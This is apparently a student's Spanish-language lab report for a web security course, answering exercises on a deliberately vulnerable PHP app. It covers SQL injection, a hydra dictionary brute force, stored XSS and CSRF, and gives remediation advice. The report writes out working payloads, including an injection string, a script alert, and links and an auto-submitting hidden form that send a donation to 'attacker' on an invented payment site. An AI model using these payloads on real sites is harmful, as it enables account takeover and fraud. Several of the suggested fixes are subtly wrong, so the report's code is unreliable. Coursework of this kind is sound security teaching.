# Informe Técnico Proyecto 8: Talent ScoutTech

## Índice

1. [Parte 1: SQLi](#sqli)
2. [Parte 2: XSS](#xss)
3. [Parte 3: Control de acceso, autenticación y sesiones de usuarios](#auth)  
4. [Parte 4- Servidores web](#servers)
5. [Parte 5- CSRF](#csrf)

# Parte 1: SQLi <div id="sqli" />
## Parte a)

Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. A partir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.
 
| Escribo los valores… | "" or 1=1-- -" |
| --- | --- |
| En el campo…	| username |
| Del formulario de la página…	| Insert_player.php |
| La consulta SQL ejecutada es…	| SELECT userId, password FROM users WHERE username = """ or 1=1-- -" |
| Campos del formulario web utilizados en la consulta sql…	| user |
| Campos del formulario web no utilizados en la consulta sql…	| password |


## Parte b)

Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):

•	password  
•	123456  
•	12345678  
•	1234  
•	qwerty  
•	12345678  
•	dragon

Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.

| Explicación del ataque | El ataque consiste en repetir peticiones de login a la página mediante la herramienta hydra utilizando en cada interacción una contraseña diferente del diccionario |
| --- | --- |
| Campo de usuario con que el ataque ha tenido éxito | luis |
| Campo de contraseña con que el ataque ha tenido éxito | 1234 |

## Parte c)

Si vais a private/auth.php, veréis que en la función areUserAndPasswordValid”, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.

| Explicación del error… | No es una función diseñada para prevenir las inyecciones, sino para escapar caracteres especiales en cadenas para su uso en consultas SQL |
| --- | --- |
| Solución: Cambiar la línea con el código… | $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"'); |
| … por la siguiente línea… | $stmt = $db->prepare('SELECT userId, password FROM users WHERE username = :username'); |

## Parte d)

Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario “luis” (si no habéis tenido éxito, podéis utilizar la contraseña “1234” para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora “Candela Pacheco”, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.

Para hacer esto, en primer lugar, habéis hecho un ataque de fuerza bruta sobre el directorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo “add_comment.php~”. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos “.php~” sino que los muestran como archivos de texto sin interpretar.

Esto os permite estudiar el código fuente de “add_comment.php” y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?
 
| Vulnerabilidad detectada… | Inyección SQL |
| --- | --- |
| Descripción del ataque… | Se aprovecha de la falta de validación para que, con una consulta SQL adecuada, pueda escribir comentarios bajo el nombre de otro usuario |
| ¿Cómo podemos hacer que sea segura esta entrada? | Utilizar consultas preparadas, validar y sanear los datos de entrada, y utilizar funciones de seguridad específicas de la base de datos, como ‘SQLite3::scapeString()’ en conjunto con las consultas preparadas:  

Utilizar consultas preparadas

```html
$stmt = $db->prepare("INSERT INTO comments (user_id, comment) VALUES (:user_id, :comment)");  
$stmt->bindValue(':user_id', $user_id, PDO::PARAM_INT);  
$stmt->bindValue(':comment', $comment, PDO::PARAM_STR);  
$stmt->execute();

```

Validar y sanear los datos de entrada:  

```html

$user_id = intval($_POST['user_id']);  
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');  
  
``` |

# Parte 2 – XXS <div id="xss" />

## Parte a)

Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments.php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.

| Introduzco el mensaje… | <script>alert('Esto es una prueba');</script> |
| --- | --- |
| En el formulario de la página… | add_comment.php?id?=5 |

## Parte b)

¿Por qué dice "&" cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GET dentro de código html si en realidad el link es sólo con "&" ?

| Explicación… | Es para asegurarse de que el código HTML sea válido y se interprete correctamente por los navegadores web, dado que tiene un significado especial y puede causar problemas de interpretación si no se codifica adecuadamente como “&” |
| --- | --- |

## Parte c)

Explicad cuál es el problema de show_comments.php, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.

| ¿Cuál es el problema? | No hay validación adecuada de los datos de entrada. |
| --- | --- |
| Sustituyo el código de la/las líneas… | $query = "INSERT INTO comments (playerId, userId, body) VALUES ('".$_GET['id']."', '".$_COOKIE['userId']."', '$body')"; |
| … por el siguiente código… | $stmt = $db->prepare("INSERT INTO comments (playerId, userId, body) VALUES (:playerId, :userId, :body)")->bindValue(':playerId', $_GET['id'])->bindValue(':userId', $_COOKIE['userId'])->bindValue(':body', SQLite3::escapeString($_POST['body']))->execute(); |

## Parte d)

Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.

| Otras páginas afectadas… | show_comments.php?id=4 |
| --- | --- |
| ¿Cómo lo he descubierto? | Probando a añadir un nuevo comentario a la página |

# Parte 3 – Control de acceso, autenticación y sesiones de usuarios <div id="auth" />

## Parte a)

En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de register.php tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.

-	Se deberían utilizar consultas preparadas en vez de la concatenación para prevenir las inyecciones SQL
-	Además, se debe hashear y sanear las contraseñas usadas, para hacer que no se almacenen las contraseñas en texto plano, usando la función de ‘password_hash()’
-	Validar y sanear los datos de entrada, para prevenir cualquier carácter o secuencia que no queramos que sea usada para las inyecciones SQL
-	Implementar un sistema de autenticación y autorización para intentar garantizar que sólo los usuarios autorizados puedan registrarse al sistema y se verifique la identidad.

## Parte b)

En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta private

-	Utilizar la función ‘password_verify()’ para comprobar las contraseñas de manera segura con las contraseñas almacenadas en la base de datos.
-	Validar y sanear los datos de entrada para eliminar los caracteres que puedan ser usados para ataques, usando funciones como ‘filter_var()’ o ‘htmlspecialchars()’
-	Utilizar un sistema de autenticación más seguro, que no use las cookies para almacenarlas.
-	Eliminar la información sensible de las cookies.

## Parte c)

Volvemos a la página de register.php, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.

-	Restringir el acceso al formulario de registro

```html

if (!isUserAdmin($userId)) {
    # Si el usuario no es administrador, redirigir a una página de error o a la página principal
    header("Location: index.php");
    exit;
}

```

-	Implementar un sistema de gestión de usuarios, donde los administradores únicamente puedan crear, editar y eliminar las cuentas.

## Parte d)

Al comienzo de la práctica hemos supuesto que la carpeta private no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?

No se llega a cumplir la condición, necesitando configurar el servidor web para que se niegue el acceso desde el navegador, imponiendo una regla en el archivo .htaccess

<Directory “D:\XAAMP\htdocs\web\private”>
	Deny from all
</Directory>

También se puede mover la carpeta “private” fuera del directorio raíz del servidor web, y restringir los permisos de archivo y directorio.

## Parte e)

Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.

-	Contando con las revisiones anteriores, todavía haría falta implementar una rotación de tokens de sesión, un sistema de cierre de sesión seguro, y HTTPS para todas las comunicaciones
-	Para implementarlos, podría utilizarse unas funciones criptográficas para generar los token de sesión seguras, su verificación y revocación al cerrar la sesión, además de configurar el HTTPS mediante un certificado SSL/TLS.

# Parte 4 – Servidores web <div id="server" />

¿Qué medidas de seguridad se implementaría en el servidor web para reducir el riesgo a ataques?

-	Configurar un cortafuegos para poder controlar y filtrar el tráfico de red.
-	Realizar auditorías periódicas de los servicios y puertos, que ayuda a configurar el cortafuegos.
-	Implementar un IDS para monitorear y detectar las intrusiones al servidor.
-	Configurar una VPN para poder establecer las conexiones seguras para los ordenadores remotos.
-	Implementar un HTTPS para establecer conexiones seguras entre el servidor y la página web.

# Parte 5 – CSRF <div id="csrf" />

Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: http://web.pagos/donate.php?amount=100&receiver=attacker, mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).

## Parte a)

Editad un jugador para conseguir que, en el listado de jugadores (list_players.php) aparezca, debajo del nombre de su equipo y antes de “(show/add comments)” un botón llamado “Profile” que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.

| En el campo… | Teams |
| --- | --- |
| Introduzco… | <br><button type="button" href="http://web.pagos/donate.php?amount=100&receiver=attacker">Profile</button> |

## Parte b)

Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show_comments.php).

<style>
    .prueba {
        text-decoration: none;
        color: inherit; 
        cursor: pointer; 
        background: white;
    }
    .prueba:hover {
        text-decoration: none;
        color: inherit; 
        cursor: pointer; 
        background: white;
        transition: none;
    }
</style>

No está mal como <a href="http://web.pagos/donate.php?amount=100&receiver=attacker" target="_blank" class="prueba">jugador</a>

## Parte c)

Pero 'web.pagos' sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).

Para realizar este apartado, web.pagos tendría que pasar a mandar una solicitud comprobando si el usuario está registrado en la plataforma, y al verificarlo, proceder al pago.

## Parte d)

Si 'web.pagos' modifica la página 'donate.php' para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al del apartado b) enviando los parámetros “amount” i “receiver” por POST.

Debido a no tener el código fuente de web.pagos, no podemos garantizar que quede blindado contra estos tipos de ataques, dado que puede mantenerse la posibilidad de hacerse ataques XSS, pudiendo ser así:

<form id="maliciousForm" action="https://web.pagos/donate.php" method="POST">
    <input type="hidden" name="amount" value="<script>alert('¡Ataque XSS!');</script>">
    <input type="hidden" name="receiver" value="usuarioMalicioso">
    <input type="submit" value="Realizar Donación">
</form>

<script>
    document.getElementById('maliciousForm').submit();
</script> 
